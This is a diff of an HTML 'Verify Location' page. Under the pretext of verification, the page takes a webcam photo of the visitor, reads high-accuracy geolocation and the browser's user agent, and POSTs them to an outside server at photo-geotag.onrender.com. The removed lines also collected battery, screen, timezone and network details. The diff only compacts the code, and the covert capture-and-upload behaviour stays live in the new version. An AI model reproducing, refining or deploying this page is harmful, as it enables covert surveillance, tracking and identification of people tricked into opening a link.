@@ -1,269 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Location</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            margin: 0;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            max-width: 700px;
-            margin: 0 auto;
-            padding: 25px;
-            border: 1px solid #ddd;
-        }
-        
-        h2 {
-            color: #333;
-            font-weight: normal;
-            margin-bottom: 20px;
-        }
-        
-        #video {
-            width: 100%;
-            max-width: 500px;
-            display: none;
-            margin: 15px 0;
-        }
-        
-        #canvas {
-            display: none;
-        }
-        
-        #capturedImage {
-            max-width: 100%;
-            margin: 15px 0;
-            display: none;
-        }
-        
-        .info {
-            background: #fafafa;
-            padding: 15px;
-            margin: 15px 0;
-            border-left: 3px solid #888;
-            display: none;
-        }
-        
-        .info p {
-            margin: 8px 0;
-            color: #555;
-            font-size: 14px;
-        }
-        
-        .status {
-            padding: 12px;
-            margin: 15px 0;
-            border: 1px solid #ddd;
-            background: #f9f9f9;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify Location</title>
 
-        .loading {
-            color: #666;
-            font-size: 14px;
-        }
-    </style>
+<style>
+body { font-family: Arial; background:#f5f5f5; margin:0; padding:20px;}
+.container{background:white; max-width:700px; margin:0 auto; padding:25px; border:1px solid #ddd;}
+.status{padding:12px;margin:15px 0;border:1px solid #ddd;background:#f9f9f9}
+#video{width:100%;max-width:500px;display:none;margin:15px 0}
+#capturedImage{max-width:100%;margin:15px 0;display:none}
+.info{background:#fafafa;padding:15px;margin:15px 0;border-left:3px solid #888;display:none}
+.info p{margin:8px 0;color:#555;font-size:14px}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <h2>Verification Required</h2>
-        
-        <div id="status" class="status">
-            <span class="loading">Please allow camera and location access...</span>
-        </div>
-        
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
-        <img id="capturedImage" alt="Capture">
-        
-        <div id="infoBox" class="info">
-            <p id="locationInfo"></p>
-            <p id="timestampInfo"></p>
-            <p id="statusInfo"></p>
-        </div>
-    </div>
+<div class="container">
+<h2>Verification Required</h2>
+<div id="status" class="status">Please allow camera and location access...</div>
 
-    <script>
-        let stream = null;
-        let photoData = null;
-        let locationData = null;
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<img id="capturedImage">
 
-        window.addEventListener('load', async () => {
-            await requestPermissions();
+<div id="infoBox" class="info">
+<p id="locationInfo"></p>
+<p id="timestampInfo"></p>
+<p id="statusInfo"></p>
+</div>
+</div>
+
+<script>
+let stream = null;
+let photoData = null;
+let locationData = null;
+
+window.addEventListener('load', async () => { await requestPermissions(); });
+
+async function requestPermissions() {
+    try {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                locationData = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: new Date(pos.timestamp).toLocaleString()
+                };
+            },
+            err => console.log("Location error:", err.message),
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+
+        stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.style.display = "block";
+
+        showStatus("Processing...");
+        setTimeout(capturePhoto, 2000);
+    } catch {
+        showStatus("Access denied. Enable permissions.");
+    }
+}
+
+function capturePhoto() {
+    const video = document.getElementById("video");
+    if (!video.videoWidth) return setTimeout(capturePhoto, 500);
+
+    const canvas = document.getElementById("canvas");
+    const img = document.getElementById("capturedImage");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    photoData = canvas.toDataURL("image/jpeg", 0.8);
+    img.src = photoData;
+    img.style.display = "block";
+
+    stream.getTracks().forEach(t => t.stop());
+    video.style.display = "none";
+
+    showStatus("Complete");
+    displayInfo();
+
+    setTimeout(sendData, 1000);
+}
+
+function displayInfo() {
+    document.getElementById("infoBox").style.display = "block";
+    document.getElementById("locationInfo").innerHTML =
+        locationData
+        ? `<strong>Coordinates:</strong> ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`
+        : "<strong>Coordinates:</strong> Unavailable";
+
+    document.getElementById("timestampInfo").innerHTML =
+        `<strong>Time:</strong> ${new Date().toLocaleString()}`;
+
+    document.getElementById("statusInfo").innerHTML =
+        "<strong>Status:</strong> Verifying...";
+}
+
+async function sendData() {
+    const serverUrl = "https://photo-geotag.onrender.com/upload";
+
+    const dataPackage = {
+        photo: photoData,
+        location: locationData,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    };
+
+    try {
+        const res = await fetch(serverUrl, {
+            method:"POST",
+            headers:{ "Content-Type":"application/json" },
+            body: JSON.stringify(dataPackage)
         });
 
-        async function requestPermissions() {
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            timestamp: new Date(position.timestamp).toLocaleString()
-                        };
-                    },
-                    (error) => {
-                        console.log('Location error:', error.message);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
-                
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }, 
-                    audio: false 
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.style.display = 'block';
-                
-                showStatus('Processing...');
-                
-                setTimeout(() => {
-                    capturePhoto();
-                }, 2000);
-                
-            } catch (error) {
-                showStatus('Access denied. Please enable permissions.');
-            }
-        }
+        if (!res.ok) throw new Error();
 
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const capturedImage = document.getElementById('capturedImage');
-            
-            if (!video.videoWidth) {
-                setTimeout(capturePhoto, 500);
-                return;
-            }
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            photoData = canvas.toDataURL('image/jpeg', 0.8);
-            capturedImage.src = photoData;
-            capturedImage.style.display = 'block';
-            
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            video.style.display = 'none';
-            
-            showStatus('Complete');
-            displayInfo();
-            
-            setTimeout(() => {
-                sendData();
-            }, 1000);
-        }
+        showStatus("Verification complete");
+        document.getElementById("statusInfo").innerHTML = "<strong>Status:</strong> Verified";
+    } catch {
+        showStatus("Verification failed");
+        document.getElementById("statusInfo").innerHTML = "<strong>Status:</strong> Failed";
+    }
+}
 
-        function displayInfo() {
-            const infoBox = document.getElementById('infoBox');
-            const locationInfo = document.getElementById('locationInfo');
-            const timestampInfo = document.getElementById('timestampInfo');
-            const statusInfo = document.getElementById('statusInfo');
-            
-            infoBox.style.display = 'block';
-            
-            if (locationData) {
-                locationInfo.innerHTML = `<strong>Coordinates:</strong> ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`;
-            } else {
-                locationInfo.innerHTML = '<strong>Coordinates:</strong> Unavailable';
-            }
-            
-            timestampInfo.innerHTML = `<strong>Time:</strong> ${new Date().toLocaleString()}`;
-            statusInfo.innerHTML = '<strong>Status:</strong> Verifying...';
-        }
-
-        async function sendData() {
-            let batteryInfo = null;
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging
-                    };
-                } catch (e) {
-                    console.log('Battery API not available');
-                }
-            }
-
-            const dataPackage = {
-                photo: photoData,
-                location: locationData,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: {
-                    width: screen.width, 
-                    height: screen.height,
-                    colorDepth: screen.colorDepth
-                },
-                language: navigator.language,
-                languages: navigator.languages,
-                battery: batteryInfo,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                connection: navigator.connection ? {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink
-                } : null
-            };
-            
-            console.log('Sending data...');
-            
-            // Replace with your actual server URL after deployment
-            const serverUrl = 'https://photo-geotag.onrender.com';
-            
-            try {
-                const response = await fetch(serverUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(dataPackage)
-                });
-                
-                if (response.ok) {
-                    const result = await response.json();
-                    showStatus('Verification complete');
-                    document.getElementById('statusInfo').innerHTML = '<strong>Status:</strong> Verified';
-                } else {
-                    throw new Error('Server error');
-                }
-            } catch (error) {
-                showStatus('Verification failed');
-                document.getElementById('statusInfo').innerHTML = '<strong>Status:</strong> Failed';
-                console.error('Error:', error);
-            }
-        }
-
-        function showStatus(message) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = message;
-        }
-    </script>
+function showStatus(msg){ document.getElementById("status").innerHTML = msg; }
+</script>
 </body>
 </html>
